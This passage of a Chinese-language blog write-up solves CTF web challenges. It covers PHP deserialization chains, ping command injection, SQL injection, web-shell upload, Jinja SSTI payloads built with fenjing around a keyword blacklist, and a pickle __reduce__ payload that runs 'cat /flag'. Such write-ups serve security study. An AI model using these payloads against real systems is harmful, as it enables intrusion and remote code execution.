class="variable">$allowed</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;allowed) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Access Denied!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>-&gt;file) || <span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>-&gt;file) === <span class="title function_ invoke__">md5</span>(<span class="string">&quot;flag.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No cheating!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>-&gt;file, <span class="string">&#x27;php://&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No php protocol!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;content === <span class="string">&quot;GET_FLAG&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Flag: &quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始我就陷入了一个误区,想着content &#x3D;&#x3D;&#x3D; “GET_FLAG”,绕后就发现页面只有GET_FLAG,就不对。分析原因是我的解只会把”GET_FLAG”写入1.txt,然后就无了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hhh</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;GET_FLAG&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hhh</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后问了一下AI,它说可以考虑利用yyy类,再看一眼,发现yyy类也有file_get_contents（我近视700度,视力有问题,Orz,Orz,Orz）,所以可以利用yyy类把flag.php的内容赋值到类hhh的content里,然后把content的东西写到2.txt里,之后访问2.txt就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hhh</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yyy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$allowed</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yyy</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hhh</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;content = <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123338637-ddb6e1f8-2e8a-404d-a421-72b9feb42929.png"></p><h2 id="File-download"><a href="#File-download" class="headerlink" title="File_download"></a>File_download</h2><p>xml</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123338974-14c670e1-5714-4e46-beb5-5334257e8c4c.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123339222-4e77b8af-ef47-4212-af24-35efc97e34e0.png"></p><p>看提示</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123339405-e793bd3b-4444-42e7-b6d8-13729db942f6.png"></p><p>扫目录</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123339613-8d33ad3b-cc84-4d90-ae50-bd453ff0c563.png"></p><p>出现了这个</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123339872-6210286b-debb-48ad-8811-162dddbaf5e6.png"></p><p>下载FlagManager源码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123340113-5ae2f612-2f64-4bcf-bbac-8af10bf50a5e.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123340318-3e87b7e5-f3ab-4c13-baab-17388c3e11e1.png"></p><p>根据ds指引下载了java反编译工具jd-gui</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123340510-5495cad3-2662-4463-829a-85af08ffdb25.png"></p><p>打开文件后出现了这个</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123340706-3728bb33-9f09-44cc-852b-c4dae052839e.png"></p><p>看不懂java,但是觉得这一些字符串很像flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123341079-0742bc70-1b7b-49d6-b721-087502c791e2.png"></p><p>ai跑脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>():</span><br><span class="line">    key = [</span><br><span class="line">        <span class="number">110</span>, <span class="number">107</span>, <span class="number">185</span>, <span class="number">183</span>, <span class="number">183</span>, <span class="number">186</span>, <span class="number">103</span>, <span class="number">185</span>, <span class="number">99</span>, <span class="number">105</span>,</span><br><span class="line">        <span class="number">105</span>, <span class="number">187</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">185</span>, <span class="number">103</span>, <span class="number">99</span>, <span class="number">108</span>,</span><br><span class="line">        <span class="number">186</span>, <span class="number">107</span>, <span class="number">187</span>, <span class="number">99</span>, <span class="number">183</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">184</span>, <span class="number">102</span>, <span class="number">106</span>,</span><br><span class="line">        <span class="number">106</span>, <span class="number">188</span>, <span class="number">109</span>, <span class="number">186</span>, <span class="number">111</span>, <span class="number">188</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    flag_chars = []</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> key:</span><br><span class="line">        original_char = (value ^ <span class="number">0x30</span>) - <span class="number">38</span></span><br><span class="line">        flag_chars.append(<span class="built_in">chr</span>(original_char))</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag_chars)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Decrypted flag is:&quot;</span>, flag)</span><br><span class="line"></span><br><span class="line">decrypt_flag()</span><br></pre></td></tr></table></figure><p>结果：Decrypted flag is: 85caad1c-33e3-0bc1-6d5e-a73b044f7d9f</p><p>sqctf{85caad1c-33e3-0bc1-6d5e-a73b044f7d9f}</p><p>?</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1744123341467-6aaa4629-8f7f-44c7-bd8d-79a8903c881f.png"></p><p>解果大写一下就对了</p><p>SQCTF{85caad1c-33e3-0bc1-6d5e-a73b044f7d9f}</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>简单的ping</p><p>|：Shell管道符,将前一个命令的输出作为后一个命令的输入。</p><p>并且题目上已经有1了,所以自己的127就可以写成27</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460082083-e6a749f1-d70b-4722-86c2-539f6636ea3e.png"></p><p>ls &#x2F;</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460082270-3e28da20-18a9-419e-89ca-ad77f23d9a5e.png"></p><p>cat &#x2F;flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460082500-d7e1a93d-5ece-49f2-9022-c56b4f6c272f.png"></p><h2 id="RceMe"><a href="#RceMe" class="headerlink" title="RceMe"></a>RceMe</h2><p>限5绕过 ls &#x2F;</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460082703-a706fc44-f3d0-460b-9c08-ed7ef833b8ab.png"></p><p>下次出个限4,不然nl &#x2F;*输出根目录下的所有内容直接就过了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460082921-55e28ed0-6aeb-48e6-811e-788187c9bc2c.png"></p><h2 id="小小查询系统"><a href="#小小查询系统" class="headerlink" title="小小查询系统"></a>小小查询系统</h2><p>sql</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460083164-7d606a8e-4460-461a-bb3c-4dc1976ca14f.png"></p><p>测试闭合条件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460083408-d7ba8236-a68c-4629-abd0-244169b3fe93.png"></p><p>测试回显位数</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460083663-3b5f6724-8ceb-494a-b217-423efcb128b4.png"></p><p>测试回显点位</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460083951-62750ebd-df2b-4e40-942b-a6c59c61ece6.png"></p><p>数据库(ctf)</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460084169-0f6b20c5-55f5-408d-8344-986531436342.png"></p><p>查表(flag)</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460084396-9ee6c6d3-680b-4c4c-9c02-e7f8b32c0f71.png"></p><p>查列(id,value)</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460084624-4d155463-3f48-4e43-92fb-8daac82591c7.png"></p><p>结果</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460084852-8cfb567e-db38-4704-ad6b-d061198f4127.png"></p><h2 id="哎呀大大大黑塔"><a href="#哎呀大大大黑塔" class="headerlink" title="哎呀大大大黑塔"></a>哎呀大大大黑塔</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460085093-d91ba5df-77d2-49ed-8442-a2c5e0c7d091.png"></p><p>?</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460085308-07dcb1a1-98a4-4f79-abb8-2ee7e3963298.png"></p><p>看PV</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460085651-bbe13007-5d43-4faf-8a91-20447eea3121.png"></p><p>宇宙有天才?    大黑塔不歪玩到关服?    42?    0+0?    6+5?</p><p>黑塔女士举世无双！黑塔女士聪明绝顶！黑塔女士沉鱼落雁！ ？</p><p><del>算了,开一把模拟宇宙找找灵感</del></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460085992-fcff4295-cc1b-4844-a7c7-447584d49881.png"></p><p>都不对,看看wp吧 </p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460086278-60f02447-5c08-406c-b0a3-d8d6854d01c4.png"></p><p>真对了,忘截图了Orz,Orz,Orz,反正就是GET传参就行了</p><p>Ok,ez反序列化,只需要key&#x3D;SQCTF就行了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460086505-e0ce4b0f-02a1-43a1-bf72-644ac97f35e4.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Secret</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$key</span>=<span class="string">&quot;SQCTF&quot;</span>; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Secret</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>data&#x3D;O:6:”Secret”:1:{s:3:”key”;s:5:”SQCTF”;}</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460086721-6df2438f-023d-477b-81c2-41aa33a65c2f.png"></p><h2 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h2><p>Level 1</p><p>sha1不识别数组,数组绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$token</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$param1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param2</span>))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$param1</span>) == <span class="title function_ invoke__">sha1</span>(<span class="variable">$param2</span>))&#123;</span><br><span class="line">    <span class="variable">$token</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Level 1 pass\n&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>param1[]&#x3D;123&amp;param2[]&#x3D;321</p><p>Level 2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TYctf</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$person</span> = <span class="number">20</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$computer_number</span> = <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getNumber</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;person)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;person;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isFullUse</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;person != <span class="variable language_">$this</span>-&gt;computer_number)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;computer is lacking !!!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;computer is enough !!!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getKey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span> (<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Level 2 pass\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You are winner, this is your reward: \n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接调用getKey函数输出就行</p><p>关于call_user_fnuc:call_user_func是PHP的内置函数,第一个参数是被调用的回调函数,其余参数是回调函数的参数</p><p>PHP手册连接:<a href="https://www.php.net/manual/zh/function.call-user-func.php">https://www.php.net/manual/zh/function.call-user-func.php</a></p><p>payload&#x3D;TYctf::getKey就行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460086949-9ebb3f9c-e63f-4755-a02d-a0867292644b.png"></p><h2 id="Upload-Level2"><a href="#Upload-Level2" class="headerlink" title="Upload_Level2"></a>Upload_Level2</h2><p>cmd包不行的</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460087154-a6d2021c-e6b2-4460-ac79-e826a2812d8a.png"></p><p> 传🐎</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460087455-197b7d34-f419-4ea3-ac81-fee78c41e1fe.png"></p><p>蚁剑连接拿flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460087652-6aaf8054-4aa2-4079-a4ac-1ef6eda6f51d.png"></p><h2 id="Input-a-number"><a href="#Input-a-number" class="headerlink" title="Input a number"></a>Input a number</h2><p>intval()<font style="color:#6425D0;"> </font>函数可以获取变量的整数值,所以构造个小数就行</p><p>114514.1919810</p><p>逸一时,误一世,逸久逸久罢已龄</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460087845-5f4da0e0-624b-4722-b72a-5986703a2f63.png"></p><h2 id="白月光"><a href="#白月光" class="headerlink" title="白月光"></a>白月光</h2><p>fenjing跑</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460088092-94626fae-dfc3-4448-a365-358623c96680.png"></p><p> 测试过后这几个被ban了:<br> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;__init__&#x27;,&#x27;__globals__&#x27;,&#x27;__builtins__&#x27;,&#x27;import&#x27;,&#x27;_&#x27;,&#x27;os&#x27;</span><br></pre></td></tr></table></figure></p><p>脚本跑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据WAF函数生成shell指令对应的payload</span></span><br><span class="line"><span class="keyword">from</span> fenjing <span class="keyword">import</span> exec_cmd_payload, config_payload</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line">logging.basicConfig(level = logging.INFO)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s: <span class="built_in">str</span></span>): <span class="comment"># 如果字符串s可以通过waf则返回True, 否则返回False</span></span><br><span class="line">    blacklist = [ <span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;__globals__&#x27;</span>,<span class="string">&#x27;__builtins__&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">all</span>(word <span class="keyword">not</span> <span class="keyword">in</span> s <span class="keyword">for</span> word <span class="keyword">in</span> blacklist)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    shell_payload, _ = exec_cmd_payload(waf, <span class="string">&quot;ls /&quot;</span>)</span><br><span class="line">    config_payload = config_payload(waf)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;config_payload=&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460088522-72c49330-3571-4335-978c-0e3b83634856.png"></p><p><font style="color:#8F959E;"></font></p><p>ls &#x2F;</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460088831-c5d8c2df-c9f5-4028-966e-5923814843f0.png"></p><p>cat &#x2F;flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460089078-dd25de5f-477a-4c26-8202-b859df9ce5d9.png"></p><h2 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h2><p>python反序列化,提示flag在&#x2F;flag里</p><p>Pickle是Python的序列化模块,可以将对象转换为字节流（序列化）,或从字节流重建对象（反序列化）。反序列化时,Pickle会按照字节流的指令重建对象,这一过程可能触发特定方法（如reduce）,从而执行任意代码。<br>如果一个类定义了reduce方法,Pickle在序列化时会调用它。该方法返回一个元组：可调用对象：如函数、类构造器。参数：传递给可调用对象的参数。</p><p>反序列化时,Pickle会调用该对象并传递参数,从而实现代码执行。</p><p>通过构造reduce方法返回恶意函数和参数,攻击者可以在反序列化时执行任意命令。</p><p>文章：<a href="https://xz.aliyun.com/news/13498"><font style="color:#3370FF;">pickle反序列化漏洞基础知识与绕过简析</font></a></p><p>ds生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 使用subprocess绕过os.system限制,并直接输出结果</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (</span><br><span class="line">            <span class="string">&quot;str(__import__(&#x27;subprocess&#x27;).check_output(&#x27;cat /flag&#x27;, shell=True))&quot;</span>, </span><br><span class="line">        ))</span><br><span class="line"></span><br><span class="line">payload = pickle.dumps(Exploit(), protocol=<span class="number">0</span>)</span><br><span class="line">b64_payload = base64.b64encode(payload).decode()</span><br><span class="line"><span class="built_in">print</span>(b64_payload)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460089321-ca1cf151-fe00-403b-b71f-58d2793f423d.png"></p><h2 id="Ez-calculate"><a href="#Ez-calculate" class="headerlink" title="Ez_calculate"></a>Ez_calculate</h2><p>快速计算</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460089504-d6bf7a90-1ad7-42fb-8e00-eedc338b62f2.png"></p><p>快速Ctrl+C,计算后POST提交也不行</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460089689-930601c3-f72b-4d41-b378-d017b110912b.png"></p><p>ds脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.qsnctf.com:32607/&quot;</span>  <span class="comment"># 替换为目标URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建会话以保持题目一致性</span></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">    <span class="comment"># 发送GET请求获取题目</span></span><br><span class="line">    response = s.get(url)</span><br><span class="line">    response.raise_for_status()  <span class="comment"># 确保请求成功</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取计算式</span></span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">    challenge_div = soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&#x27;challenge&#x27;</span>)</span><br><span class="line">    expression = challenge_div.text.strip()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算结果（假设表达式仅含+、-、*）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(expression)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提交POST请求</span></span><br><span class="line">    post_data = &#123;<span class="string">&#x27;value&#x27;</span>: <span class="built_in">int</span>(result)&#125;</span><br><span class="line">    post_response = s.post(url, data=post_data)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;响应内容:&quot;</span>, post_response.text)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746460089888-9801c89b-fec9-45a0-b2fa-ae4514ff1bd9.png"></p><p>说明还需要点击这个按钮,再写一个点击的脚本就行</p><p>ds脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td 